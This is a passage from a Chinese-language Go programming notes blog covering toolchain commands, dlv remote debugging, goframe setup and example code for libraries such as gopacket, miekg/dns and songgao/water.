(JMPREL)             0xf90</span><br><span class="line"> 0x0000000000000014 (PLTREL)             RELA</span><br><span class="line"> 0x0000000000000007 (RELA)               0x948</span><br><span class="line"> 0x0000000000000008 (RELASZ)             1608 (bytes)</span><br><span class="line"> 0x0000000000000009 (RELAENT)            24 (bytes)</span><br><span class="line"> 0x000000006ffffff9 (RELACOUNT)          55</span><br><span class="line"> 0x0000000000000006 (SYMTAB)             0x288</span><br><span class="line"> 0x000000000000000b (SYMENT)             24 (bytes)</span><br><span class="line"> 0x0000000000000005 (STRTAB)             0x5a0</span><br><span class="line"> 0x000000000000000a (STRSZ)              700 (bytes)</span><br><span class="line"> 0x000000006ffffef5 (GNU_HASH)           0x860</span><br><span class="line"> 0x0000000000000001 (NEEDED)             Shared library: [libstd.so]</span><br><span class="line"> 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000000000001 (NEEDED)             Shared library: [ld-linux-aarch64.so.1]</span><br><span class="line"> 0x000000000000000c (INIT)               0x1098</span><br><span class="line"> 0x000000000000000d (FINI)               0x13d0</span><br><span class="line"> 0x000000000000001a (FINI_ARRAY)         0x1f940</span><br><span class="line"> 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)</span><br><span class="line"> 0x0000000000000019 (INIT_ARRAY)         0x1f948</span><br><span class="line"> 0x000000000000001b (INIT_ARRAYSZ)       24 (bytes)</span><br><span class="line"> 0x000000000000001d (RUNPATH)            Library runpath: [/usr/lib/go/pkg/linux_arm64_dynlink/]</span><br><span class="line"> 0x0000000000000010 (SYMBOLIC)           0x0</span><br><span class="line"> 0x000000000000001e (FLAGS)              SYMBOLIC BIND_NOW</span><br><span class="line"> 0x000000006ffffffb (FLAGS_1)            Flags: NOW NODELETE</span><br><span class="line"> 0x000000006ffffff0 (VERSYM)             0x8a8</span><br><span class="line"> 0x000000006ffffffc (VERDEF)             0x8ec</span><br><span class="line"> 0x000000006ffffffd (VERDEFNUM)          1</span><br><span class="line"> 0x000000006ffffffe (VERNEED)            0x908</span><br><span class="line"> 0x000000006fffffff (VERNEEDNUM)         2</span><br><span class="line"> 0x0000000000000000 (NULL)               0x0</span><br></pre></td></tr></table></figure>

<h2 id="3-go-env-设置环境变量"><a href="#3-go-env-设置环境变量" class="headerlink" title="3. go env 设置环境变量"></a>3. go env 设置环境变量</h2><ul>
<li>设置的全局变量是全局生效的，重启都会生效</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置环境变量</span></span><br><span class="line">go env -w xxx=xx</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">恢复环境变量到默认值</span></span><br><span class="line">go env -u xxx</span><br></pre></td></tr></table></figure>

<p><strong>实例</strong></p>
<ul>
<li>可以写到makefile中，跨平台的makefile</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">main.exe: main.go</span></span><br><span class="line">	go env -w GOOS=windows</span><br><span class="line">	go build</span><br><span class="line">	go env -u GOOS</span><br></pre></td></tr></table></figure>

<h2 id="4-go-install-安装全局包"><a href="#4-go-install-安装全局包" class="headerlink" title="4. go install 安装全局包"></a>4. go install 安装全局包</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go install -v github.com/cweill/gotests/gotests@v1.6.0</span><br></pre></td></tr></table></figure>

<h3 id="4-1-常用工具链接"><a href="#4-1-常用工具链接" class="headerlink" title="4.1. 常用工具链接"></a>4.1. 常用工具链接</h3><ul>
<li>gotest: <code>github.com/cweill/gotests/gotests</code></li>
<li>go-outline: <code>github.com/ramya-rao-a/go-outline</code></li>
<li>gopls: <code>golang.org/x/tools/gopls</code></li>
<li>dlv: <code>github.com/go-delve/delve/cmd/dlv</code></li>
</ul>
<h2 id="5-go-generate-执行命令"><a href="#5-go-generate-执行命令" class="headerlink" title="5. go generate 执行命令"></a>5. go generate 执行命令</h2><ul>
<li>在go文件中定义的命令，调用<code>go generate</code>时会执行</li>
<li>需要在<code>main.go</code>文件中如下定义，注释和go之间不能有空格，会执行generate后面的命令</li>
<li>一般用于生成语言文件或错误码信息等可以用命令生成的文件</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//go:generate gf pack -y i18n catalog/catalog.go</span></span><br></pre></td></tr></table></figure>

<h2 id="6-dlv-调试go程序"><a href="#6-dlv-调试go程序" class="headerlink" title="6. dlv 调试go程序"></a>6. dlv 调试go程序</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go install -v github.com/go-delve/delve/cmd/dlv@v1.6.0</span><br></pre></td></tr></table></figure>

<h3 id="6-1-dlv监听远程调试"><a href="#6-1-dlv监听远程调试" class="headerlink" title="6.1. dlv监听远程调试"></a>6.1. dlv监听远程调试</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监听6666端口，挂载16703进程号</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--api-version 设置version为2，默认是1，vscode的客户端会使用2</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--headless=<span class="literal">true</span> 只启动server调试，不清楚什么是headless，但是都加了。。。</span></span><br><span class="line">dlv --listen=:6666 --headless=true --api-version=2 attach 16703</span><br></pre></td></tr></table></figure>

<ul>
<li>vscode中launch.json如下</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// Use IntelliSense to learn about possible attributes.</span></span><br><span class="line">    <span class="comment">// Hover to view descriptions of existing attributes.</span></span><br><span class="line">    <span class="comment">// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Connect to server&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;go&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;attach&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;remote&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;remotePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">6666</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;172.22.231.55&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="五、框架"><a href="#五、框架" class="headerlink" title="五、框架"></a>五、框架</h1><h2 id="1-工程知识"><a href="#1-工程知识" class="headerlink" title="1. 工程知识"></a>1. 工程知识</h2><h3 id="1-1-go-mod"><a href="#1-1-go-mod" class="headerlink" title="1.1. go.mod"></a>1.1. go.mod</h3><ul>
<li><code>go.mod</code>是go工程用来管理包使用的，类似于nodejs的<code>package.json</code>文件</li>
</ul>
<h4 id="1-创建新工程"><a href="#1-创建新工程" class="headerlink" title="1) 创建新工程"></a>1) 创建新工程</h4><p><strong>1. 先生成go.mod文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">初始化一个<span class="built_in">test</span>工程</span></span><br><span class="line">go mod init test</span><br></pre></td></tr></table></figure>

<h4 id="2-go-mod-一些基本操作"><a href="#2-go-mod-一些基本操作" class="headerlink" title="2) go mod 一些基本操作"></a>2) go mod 一些基本操作</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加工程依赖包，会加入到go.mod文件中的require中</span></span><br><span class="line">go mod download github.com/mattn/go-sqlite3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据go.mod文件处理依赖关系</span></span><br><span class="line">go mod tidy</span><br></pre></td></tr></table></figure>

<h5 id="1-vendor"><a href="#1-vendor" class="headerlink" title="(1) vendor"></a>(1) vendor</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">同步依赖包到当前的vendor目录</span></span><br><span class="line">go mod vendor</span><br></pre></td></tr></table></figure>

<h2 id="2-goframe"><a href="#2-goframe" class="headerlink" title="2. goframe"></a>2. goframe</h2><h3 id="2-1-安装配置"><a href="#2-1-安装配置" class="headerlink" title="2.1. 安装配置"></a>2.1. 安装配置</h3><p><strong>安装gf命令行工具</strong></p>
<ul>
<li>goframe安装需要一个gf命令行工具</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载安装gf</span></span><br><span class="line">wget -O gf https://github.com/gogf/gf-cli/releases/download/v1.16.3/gf_linux_amd64 &amp;&amp; chmod +x gf &amp;&amp; ./gf install</span><br></pre></td></tr></table></figure>

<ul>
<li>默认gf命令行工具不支持sqlite3，如果需要，上面安装完之后，自己编译一版sqlite3的gf工具</li>
<li>确保有gcc编译环境</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">clone</span>仓库</span></span><br><span class="line">git clone https://github.com/gogf/gf-cli &amp;&amp; cd gf-cli</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置环境变量</span></span><br><span class="line">export CGO_ENABLED=1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将代码中的sqlite3依赖取消注释</span></span><br><span class="line">vim command/gen/gen_dao.go</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行gf的编译命令，需要上述步骤先下载gf工具</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-a指定平台，可以编译下面几种平台</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">      darwin    amd64,arm64</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">      freebsd   386,amd64,arm</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">      linux     386,amd64,arm,arm64,ppc64,ppc64le,mips,mipsle,mips64,mips64le</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">      netbsd    386,amd64,arm</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">      openbsd   386,amd64,arm</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">      windows   386,amd64</span></span><br><span class="line">gf build main.go -a amd64 -s linux --cgo</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">cp bin/linux_amd64/gf /usr/local/bin/gf</span><br></pre></td></tr></table></figure>

<p><strong>初始化</strong></p>
<ul>
<li>如果需要使用sqlite3，需要在项目根目录执行</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go mod download github.com/mattn/go-sqlite3</span><br></pre></td></tr></table></figure>

<p><strong>代码生成</strong></p>
<ul>
<li>根据<code>config.toml</code>生成数据库代码，这个比较方便</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gf gen dao -c config/config.toml</span><br></pre></td></tr></table></figure>

<h3 id="2-2-开发知识点"><a href="#2-2-开发知识点" class="headerlink" title="2.2. 开发知识点"></a>2.2. 开发知识点</h3><h4 id="2-2-1-orm时间维护功能"><a href="#2-2-1-orm时间维护功能" class="headerlink" title="2.2.1. orm时间维护功能"></a>2.2.1. orm时间维护功能</h4><ul>
<li>orm的数据库更新操作会自动更新updatedAt、createdAt、deletedAt等字段</li>
<li>不想要更新字段需要加上<code>Unscoped()</code></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">db.Table(<span class="string">&quot;user&quot;</span>).Unscoped().Data(g.Map&#123;<span class="string">&quot;name&quot;</span> : <span class="string">&quot;john guo&quot;</span>&#125;).Where(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;john&quot;</span>).Update()</span><br></pre></td></tr></table></figure>

<h3 id="2-2-2-前后端字段对应"><a href="#2-2-2-前后端字段对应" class="headerlink" title="2.2.2. 前后端字段对应"></a>2.2.2. 前后端字段对应</h3><ul>
<li>gf中使用下面的方法可以将前端传入参数解析到struct的对应成员中</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// app/model/xxx.go</span></span><br><span class="line"><span class="keyword">type</span> TaskApiCreateReq <span class="keyword">struct</span> &#123;</span><br><span class="line">	Content  <span class="type">string</span> <span class="string">`json:&quot;content&quot; v:&quot;required|length:1,100#任务内容不能为空|任务内容应当在:min到:max之间&quot;`</span></span><br><span class="line">	TaskType <span class="type">int</span>    <span class="string">`json:&quot;taskType&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// app/api/xxx.go</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *task)</span></span> Create(r *ghttp.Request) &#123;</span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		data *model.TaskApiCreateReq</span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">if</span> err := r.Parse(&amp;data); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		response.JsonExit(r, <span class="number">1</span>, err.Error())</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>解析规则，会把前端传入的字段去除除了字母和数字的所有特殊字符，然后不区分大小写比较</li>
<li>下面的几个key都可以解析到上面的<code>data.Content</code>中</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;Content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;con_tent&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;conTent&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xxx&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="六、好用的第三方库"><a href="#六、好用的第三方库" class="headerlink" title="六、好用的第三方库"></a>六、好用的第三方库</h1><h2 id="1-github-com-google-uuid-uuid"><a href="#1-github-com-google-uuid-uuid" class="headerlink" title="1. github.com/google/uuid uuid"></a>1. <code>github.com/google/uuid</code> uuid</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/google/uuid&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	id := uuid.New()</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%s %s\n&quot;</span>, id, id.Version().String())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>输出</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ab8d63ef-f0c4-a01d-a6ef-5f2c3efff5af VERSION_4</span><br></pre></td></tr></table></figure>

<h2 id="2-github-com-makiuchi-d-gozxing-二维码解析和生成"><a href="#2-github-com-makiuchi-d-gozxing-二维码解析和生成" class="headerlink" title="2. github.com/makiuchi-d/gozxing 二维码解析和生成"></a>2. <code>github.com/makiuchi-d/gozxing</code> 二维码解析和生成</h2><ul>
<li><code>github.com/tuotoo/qrcode</code>没成功的，这个成功了</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;image&quot;</span></span><br><span class="line">	<span class="string">&quot;image/png&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/makiuchi-d/gozxing&quot;</span></span><br><span class="line">	_ <span class="string">&quot;github.com/makiuchi-d/gozxing/common&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/makiuchi-d/gozxing/qrcode&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">parseQrcode</span><span class="params">(pngPath <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	originByte, _ := ioutil.ReadFile(pngPath)</span><br><span class="line">	originBuffer := bytes.NewBuffer(originByte)</span><br><span class="line">	originImg, _, err := image.Decode(originBuffer)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err.Error()</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(filename)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 解析二维码返回结果</span></span><br><span class="line">	bmp, _ := gozxing.NewBinaryBitmapFromImage(originImg)</span><br><span class="line">	qrReader := qrcode.NewQRCodeReader()</span><br><span class="line">	result, err := qrReader.Decode(bmp, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err.Error()</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result.GetText()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-golang-org-x-mobile-go开发android和ios"><a href="#3-golang-org-x-mobile-go开发android和ios" class="headerlink" title="3. golang.org/x/mobile go开发android和ios"></a>3. <code>golang.org/x/mobile</code> go开发android和ios</h2><p><a href="/blogs/2022-05-24-gomobile">gomobile使用笔记</a></p>
<h2 id="4-github-com-shirou-gopsutil-process-获取进程相关信息"><a href="#4-github-com-shirou-gopsutil-process-获取进程相关信息" class="headerlink" title="4. github.com/shirou/gopsutil/process 获取进程相关信息"></a>4. <code>github.com/shirou/gopsutil/process</code> 获取进程相关信息</h2><h3 id="4-1-获取进程信息"><a href="#4-1-获取进程信息" class="headerlink" title="4.1. 获取进程信息"></a>4.1. 获取进程信息</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取进程对应的目录</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getProcessDir</span><span class="params">(name <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="comment">// 获取所有进程id</span></span><br><span class="line">	pids, _ := process.Pids()</span><br><span class="line">	<span class="keyword">for</span> _, pid := <span class="keyword">range</span> pids &#123;</span><br><span class="line">		p, _ := process.NewProcess(<span class="type">int32</span>(pid))</span><br><span class="line">		tmp, _ := p.Name()</span><br><span class="line">		<span class="keyword">if</span> tmp != name &#123;</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(p.Name())		<span class="comment">// 名称，一般是二进制名称</span></span><br><span class="line">		fmt.Println(p.Exe())		<span class="comment">// 二进制路径</span></span><br><span class="line">		fmt.Println(p.Cwd())		<span class="comment">// 二进制运行环境变量</span></span><br><span class="line">		fmt.Println(p.Cmdline())	<span class="comment">// 二进制运行命令行参数</span></span><br><span class="line">		fmt.Println(p.Uids())</span><br><span class="line">		fmt.Println(p.Gids())</span><br><span class="line">		fmt.Println(p.Username())</span><br><span class="line">		fmt.Println(p.CreateTime())</span><br><span class="line">		fmt.Println(p.MemoryInfo())</span><br><span class="line">		fmt.Println(p.MemoryInfoEx())</span><br><span class="line">		fmt.Println(p.NumCtxSwitches())</span><br><span class="line">		fmt.Println(p.NumFDs())</span><br><span class="line">		fmt.Println(p.NumThreads())</span><br><span class="line">		fmt.Println(p.OpenFiles())</span><br><span class="line">		fmt.Println(p.Connections())</span><br><span class="line">		fmt.Println(p.IsRunning())</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-github-com-miekg-dns-构造dns包发送"><a href="#5-github-com-miekg-dns-构造dns包发送" class="headerlink" title="5. github.com/miekg/dns 构造dns包发送"></a>5. <code>github.com/miekg/dns</code> 构造dns包发送</h2><h3 id="5-1-获取域名特定类型的解析"><a href="#5-1-获取域名特定类型的解析" class="headerlink" title="5.1. 获取域名特定类型的解析"></a>5.1. 获取域名特定类型的解析</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">resolveDomain</span><span class="params">(domain <span class="type">string</span>, server <span class="type">string</span>, dnsType <span class="type">uint16</span>)</span></span> (r *dns.Msg, err <span class="type">error</span>) &#123;</span><br><span class="line">	cli := dns.Client&#123;</span><br><span class="line">		Timeout: <span class="number">5</span> * time.Second,</span><br><span class="line">	&#125;</span><br><span class="line">	m := dns.Msg&#123;&#125;</span><br><span class="line">	m.SetQuestion(dns.Fqdn(domain), dnsType)</span><br><span class="line">	m.Id = dns.Id()</span><br><span class="line">	m.RecursionDesired = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">	r, _, err = cli.Exchange(&amp;m, server+<span class="string">&quot;:53&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(r.String())	<span class="comment">// 打印类似dig的输出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-golang-org-x-text-encoding-simplifiedchinese-中文编码转换"><a href="#6-golang-org-x-text-encoding-simplifiedchinese-中文编码转换" class="headerlink" title="6. golang.org/x/text/encoding/simplifiedchinese 中文编码转换"></a>6. <code>golang.org/x/text/encoding/simplifiedchinese</code> 中文编码转换</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;golang.org/x/text/encoding/simplifiedchinese&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConvertStr2GBK</span><span class="params">(str <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="comment">//将utf-8编码的字符串转换为GBK编码</span></span><br><span class="line">    ret, err := simplifiedchinese.GBK.NewEncoder().String(str)</span><br><span class="line">    <span class="keyword">return</span> ret   <span class="comment">//如果转换失败返回空字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果是[]byte格式的字符串，可以使用Bytes方法</span></span><br><span class="line">    b, err := simplifiedchinese.GBK.NewEncoder().Bytes([]<span class="type">byte</span>(str))</span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConvertGBK2Str</span><span class="params">(gbkStr <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="comment">//将GBK编码的字符串转换为utf-8编码</span></span><br><span class="line">    ret, err := simplifiedchinese.GBK.NewDecoder().String(gbkStr)</span><br><span class="line">    <span class="keyword">return</span> ret <span class="comment">//如果转换失败返回空字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果是[]byte格式的字符串，可以使用Bytes方法</span></span><br><span class="line">    b, err := simplifiedchinese.GBK.NewDecoder().Bytes([]<span class="type">byte</span>(gbkStr))</span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="7-github-com-google-gopacket"><a href="#7-github-com-google-gopacket" class="headerlink" title="7. github.com/google/gopacket"></a>7. <code>github.com/google/gopacket</code></h2><h3 id="7-1-构造ip包"><a href="#7-1-构造ip包" class="headerlink" title="7.1. 构造ip包"></a>7.1. 构造ip包</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/google/gopacket&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/google/gopacket/layers&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 构建destination ip</span></span><br><span class="line">	<span class="keyword">const</span> (</span><br><span class="line">		IPv4 = <span class="string">&quot;ip4&quot;</span></span><br><span class="line">		Addr = <span class="string">&quot;199.200.2.170&quot;</span></span><br><span class="line">		Port = <span class="number">12345</span></span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	dstIP, _ := net.ResolveIPAddr(IPv4, Addr)</span><br><span class="line">	dstPort := layers.TCPPort(Port)</span><br><span class="line"></span><br><span class="line">	sIP, _ := net.ResolveIPAddr(IPv4, <span class="string">&quot;2.0.0.1&quot;</span>)</span><br><span class="line">	srcPort := layers.TCPPort(<span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">	fmt.Printf(<span class="string">&quot;Local IP:PORT - %s:%d \n&quot;</span>, sIP, srcPort)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 构建IP包</span></span><br><span class="line">	ipPack := &amp;layers.IPv4&#123;</span><br><span class="line">		Version:  <span class="number">4</span>,</span><br><span class="line">		SrcIP:    sIP.IP,</span><br><span class="line">		DstIP:    dstIP.IP,</span><br><span class="line">		TTL:      <span class="number">64</span>,</span><br><span class="line">		Protocol: layers.IPProtocolTCP,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 构建tcp报文段</span></span><br><span class="line">	tcpPack := &amp;layers.TCP&#123;</span><br><span class="line">		SrcPort: srcPort,</span><br><span class="line">		DstPort: dstPort,</span><br><span class="line">		Seq:     <span class="number">1205014776</span>,</span><br><span class="line">		SYN:     <span class="literal">true</span>,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := tcpPack.SetNetworkLayerForChecksum(ipPack); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalln(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	serialBuf := gopacket.NewSerializeBuffer()</span><br><span class="line">	serialOpts := gopacket.SerializeOptions&#123;</span><br><span class="line">		ComputeChecksums: <span class="literal">true</span>,</span><br><span class="line">		FixLengths:       <span class="literal">true</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err := gopacket.SerializeLayers(serialBuf, serialOpts, ipPack, tcpPack); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalln(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 打印ip包</span></span><br><span class="line">	fmt.Println(serialBuf.Bytes())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="8-github-com-songgao-water-linux虚拟网卡设备"><a href="#8-github-com-songgao-water-linux虚拟网卡设备" class="headerlink" title="8. github.com/songgao/water linux虚拟网卡设备"></a>8. <code>github.com/songgao/water</code> linux虚拟网卡设备</h2><h3 id="8-1-构造tun设备读写数据"><a href="#8-1-构造tun设备读写数据" class="headerlink" title="8.1. 构造tun设备读写数据"></a>8.1. 构造tun设备读写数据</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 创建TUN设备</span></span><br><span class="line">	config := water.Config&#123;</span><br><span class="line">		DeviceType: water.TUN,</span><br><span class="line">		PlatformSpecificParams: water.PlatformSpecificParams&#123;</span><br><span class="line">			Name: <span class="string">&quot;tun123&quot;</span>,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">	ifce, err := water.New(config)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;create tun&quot;</span>, ifce.Name())</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 启用网卡</span></span><br><span class="line">	cmd := exec.Command(<span class="string">&quot;ifconfig&quot;</span>, ifce.Name(), <span class="string">&quot;up&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err := cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 接收数据包</span></span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1500</span>)</span><br><span class="line">		<span 